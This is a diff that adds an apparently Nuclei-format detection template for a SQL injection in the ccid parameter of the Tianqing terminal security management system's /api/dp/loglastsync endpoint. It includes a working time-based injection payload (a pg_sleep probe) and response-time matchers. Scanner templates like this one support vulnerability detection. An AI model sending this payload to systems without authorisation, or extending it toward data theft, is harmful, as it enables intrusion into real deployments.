@@ -1,0 +1,29 @@
+id: tianqing-loglastsync-sqli
+info:
+  name: Tianqing Terminal Security Management System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in the ccid parameter of the /api/dp/loglastsync endpoint in Qi'an Xintianqing terminal security management system. Exploiting this can lead to database information exposure or even command execution.
+  classification:
+    cvss-score: 8.9
+  metadata:
+    exploit: true
+  tags: sqli,command-execution
+http:
+  - raw:
+      - |
+        GET /api/dp/loglastsync?ccid=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /api/dp/loglastsync?ccid=a%27));select%20pg_sleep(1)--%20 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "response_time > 1000"
+          - "response_time < 2000"
